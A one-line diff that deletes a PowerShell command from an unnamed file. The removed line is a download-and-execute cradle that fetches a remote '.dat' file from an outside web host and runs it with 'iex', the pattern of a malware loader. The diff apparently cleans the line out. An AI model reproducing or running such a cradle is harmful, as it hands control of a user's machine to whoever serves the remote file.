@@ -1,1 +1,0 @@
-iex(New-Object Net.WebClient).DownloadString('http://www.geographycollector.com/shared/ps.dat')
